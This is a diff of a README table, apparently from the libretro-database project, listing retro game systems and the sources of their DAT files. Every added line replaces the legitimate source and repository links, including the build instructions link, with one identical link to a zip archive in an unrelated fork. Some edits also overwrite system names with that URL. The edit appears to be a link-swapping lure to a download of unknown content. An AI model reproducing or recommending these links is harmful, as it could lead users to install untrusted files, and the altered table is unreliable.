+|Phillips - Videopac+|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |PuzzleScript| |
-|RCA - Studio II|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
+|RCA - Studio II|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |Rick Dangerous| |
 |RPG Maker| |
-|ScummVM|Gruby's ScummVM Adventure Pack|[libretro-database-scummvm](https://github.com/RobLoach/libretro-database-scummvm)|
-|Sega - 32X|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Dreamcast|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Game Gear|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Master System - Mark III|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Mega CD - Sega CD|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Mega Drive - Genesis|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Naomi|[Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Naomi 2|[Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - PICO|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - Saturn|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sega - SG-1000|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sharp - X1|[No-Intro](http://datomatic.no-intro.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sharp - X68000|[No-Intro](http://datomatic.no-intro.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sinclair - ZX 81|[TOSEC](https://www.tosecdev.org/)| |
-|Sinclair - ZX Spectrum|[World of Spectrum](https://www.worldofspectrum.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sinclair - ZX Spectrum +3|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|SNK - Neo Geo CD|[Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|SNK - Neo Geo Pocket|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|SNK - Neo Geo Pocket Color|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation 2|[Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation 3|[GameTDB](http://www.gametdb.com/) > [Redump](http://redump.org) (Note: there is no libretro emulator)|[libretro-database-gametdb](https://github.com/RobLoach/libretro-database-gametdb) [libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation 3 (PSN)|[No-Intro](http://datomatic.no-intro.org) (Note: there is no libretro emulator)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation Portable|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation Portable (PSN)|[No-Intro](http://datomatic.no-intro.org) > [Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Sony - PlayStation Vita|[No-Intro](http://datomatic.no-intro.org) (Note: there is no libretro emulator)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Spectravideo - SVI-318 - SVI-328|[TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|The 3DO Company - 3DO|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Thomson - MO/TO|[TOSEC](https://www.tosecdev.org/)| |
-|TIC-80|[tic80.com](https://tic80.com/play)|[libretro-database-tic80](https://github.com/robloach/libretro-database-tic80)|
-|Tiger - Game.com|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
+|ScummVM|Gruby's ScummVM Adventure Pack|[libretro-database-scummvm](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - 32X|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Dreamcast|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Game Gear|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Master System - Mark III|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Mega CD - Sega CD|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Mega Drive - Genesis|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Naomi|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Naomi 2|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - PICO|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - Saturn|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sega - SG-1000|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sharp - X1|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sharp - X68000|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sinclair - ZX 81|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)| |
+|Sinclair - ZX Spectrum|[World of Spectrum](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sinclair - ZX Spectrum +3|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|SNK - Neo Geo CD|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|SNK - Neo Geo Pocket|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|SNK - Neo Geo Pocket Color|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation 2|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation 3|[GameTDB](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: there is no libretro emulator)|[libretro-database-gametdb](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) [libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation 3 (PSN)|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: there is no libretro emulator)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation Portable|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation Portable (PSN)|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Sony - PlayStation Vita|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: there is no libretro emulator)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Spectravideo - SVI-318 - SVI-328|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|The 3DO Company - 3DO|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Thomson - MO/TO|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)| |
+|TIC-80|[https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-database-tic80](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Tiger - https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |Tomb Raider| |
 |Uzebox|Unknown|
 |Vircon32| |
-|VTech - CreatiVision|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|VTech - V.Smile|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|WASM-4| |[libretro-database-wasm4](https://github.com/robloach/libretro-database-wasm-4)
-|Watara - Supervision|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
+|VTech - CreatiVision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|VTech - https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|WASM-4| |[libretro-database-wasm4](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Watara - Supervision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |Wolfenstein 3D| |
 
 ## Building
 
-To build a complete set of RDB files for RetroArch or to generate a single RDB file, see [RetroArch/libretro-db/README.md](https://github.com/libretro/RetroArch/blob/master/libretro-db/README.md).
+To build a complete set of RDB files for RetroArch or to generate a single RDB file, see [https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip).
 
 Alternatively, you can run the following command to rebuild all the RDBs locally:
 
